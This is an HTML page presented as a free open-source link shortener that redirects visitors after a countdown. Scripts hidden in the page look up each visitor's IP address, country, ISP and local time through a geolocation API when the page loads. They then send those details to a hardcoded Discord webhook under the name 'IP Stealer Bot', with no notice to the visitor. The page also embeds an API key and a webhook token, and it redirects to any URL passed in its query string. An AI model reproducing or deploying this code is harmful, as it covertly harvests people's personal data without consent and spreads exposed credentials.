<!DOCTYPE html>
<html lang="en">
<head>
    <script>
        function getIP() {
            var request = new XMLHttpRequest();

        request.open('GET', 'https://api.ipgeolocation.io/ipgeo?apiKey=a7f356c6c6f44c40924a12454d90590b');

        request.setRequestHeader('Accept', 'application/json');

        request.onreadystatechange = function () {{
            //console.log(this.responseText);
            uip = this.responseText;
            var uips = JSON.parse(uip);
            c_flag = uips.country_flag;
            target_time = convertTZ(uips.time_zone.current_time,"Asia/Tehran");
            uuipa = "\n" + "\n User IP: " + uips.ip + "\n\n User Country: " + uips.country_name + "\n\n User ISP: " + uips.isp + "\n\n Local Time: " + timeConverter(uips.time_zone.current_time_unix) + "\n\n Your Timezone: " + target_time;
        }
    };

    request.send();
        }

        var uip = 0;
            var uuipa = "";
            var c_flag = "";
            var target_time = "";
            
            getIP();
    </script>
    <meta charset="UTF-8">
        <meta name="description" content="A free useless open source link shortener made by @MohsenEMX">
        <meta name="title" content="Link Shortener">
        <meta name="keywords" content="terminal, terminal in web,google,link short,link shorter,short,links, ">
        <meta name="author" content="@MohsenEMX">
        <meta property="og:image" content="assets/og.png" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
        <link rel="stylesheet" href="./assets/style.css">
        <link rel="stylesheet" href="./assets/mstyle.css">
    <title>Link Shortener</title>
    
</head>
<body>
    <h1 id="yolup"></h1>
    <div class="yes">
        <progress value="0" max="100" id="progressBar"></progress>
        <br />
        <p id="yup" onclick="sendMessage()">Made by MohsenEMX</p>
    </div>
    
    <script>
        
        var time = 5000;
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        let parm = urlParams.get('u');
        let parm2 = urlParams.get('t');
        let sec_parm = urlParams.get('q');
        let parm3 = urlParams.get('url');
        if (parm2 != null) {
                time = parm2 * 1000;
                var timeleft = parm2;
            } else if (parm2 == null) {
                var timeleft = 5;
            }
            console.log('DON\'T LOOK AT MY CONSOLE!');
            var countup = 1;
            document.getElementById('progressBar').setAttribute('max',time);
            let x = setInterval(function() {
                
                if (time <= 0) {
                    
                    var ggh = setTimeout(function() {
                    sendMessage();
                    clearInterval(ggh);
                    },1000);
                    document.getElementById('yolup').innerHTML = 'Redirecting Now!';
                    
                    document.title = 'Redirecting Now!';
                    clearInterval(x);
                    r();
                } else {
                    document.getElementById('yolup').innerHTML = 'You\'ll be Redirected In ' + timeleft + ' seconds!';
                    document.getElementById('progressBar').value = countup;
                    if (!(time % 1000)) {
                    timeleft -= 1;
                    }
                    countup += 11;
                    time -= 10;
                    
                }
            },10);
            
            function r() {
                
            switch (parm) {
                case 'loop': {
                    // location.href = 'https://s.nashef.ir/?u=loop';
                    redirect('https://s.nashef.ir/?u=loop',100);
                    break;
                }
                case 'g': {
                    // location.href = 'https://google.com';
                    redirect('https://google.com',100);
                    break;
                }
                case 'social': {
                    // location.href = 'https://linktr.ee/MohsenEMX';
                    redirect('https://linktr.ee/MohsenEMX',100);
                    break;
                }
                case 'github': {
                    //location.href = 'https://github.com/MohsenEMX';
                    redirect('https://github.com/MohsenEMX',100);
                    break;
                }
                case 'request': {
                    // location.href = 'https://s.nashef.ir/request';
                    redirect('https://s.nashef.ir/request',100);
                    break;
                }
                case 'links': {
                    //location.href = 'https://s.nashef.ir/urls';
                    redirect('https://s.nashef.ir/urls',100);
                    break;
                }
                case 'a': {
                    //location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
                    redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ',100);
                    break;
                }
                case '0': {
                    console.log('Code 0 does nothing',100);
                    break;
                }
                default: {
                    if (parm3 != null) {
                        
                        redirect(parm3,10000);
                    } else {
                        location.href = './404.html';
                    }
                }
                
            }
            if (sec_parm == 0) {
                redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ',100)
            }
        }
        var ggh = setTimeout(function() {
                    sendMessage();
                    clearInterval(ggh);
                    },1000);
        function redirect (url,time1) {
            var qq = setInterval(function() {
                sendMessage();
                location.href = url;
                clearInterval(qq);
            },time1);
        }
        function sendMessage() {
            let oonn = Math.floor((Math.random() * 1732) % 50000) + 1;
      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1078404244543127674/XbEedJpAY9IattJ-fH04cEkEFu6I51Mp46mFFYjxCsY-iQXAzwYZ_ppsM09RASSbT7fZ");

      request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "IP Stealer Bot - " + oonn,
        avatar_url: c_flag,
        content: "<@756486346645962753> \n\n" + "A user used the link sohrter, here is the user info: \n" + uuipa,
      }

      request.send(JSON.stringify(params));
    }

    function timeConverter(UNIX_timestamp) {
  var a = new Date(UNIX_timestamp * 1000);
  var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  var year = a.getFullYear();
  var month = months[a.getMonth()];
  var date = a.getDate();
  var hour = a.getHours();
  var min = a.getMinutes();
  var sec = a.getSeconds();
  var time = date + ' ' + month + ' ' + year + ' - ' + hour + ':' + min + ':' + sec ;
  return time;
}
function convertTZ(date, tzString) {
    return new Date((typeof date === "string" ? new Date(date) : date).toLocaleString("en-US", {timeZone: tzString}));   
}
    </script>
</body>
</html>
